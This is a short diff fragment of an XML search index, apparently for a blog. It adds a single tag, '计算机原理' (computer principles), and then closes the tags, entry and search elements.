+        <tag>计算机原理</tag>
       </tags>
   </entry>
 </search>
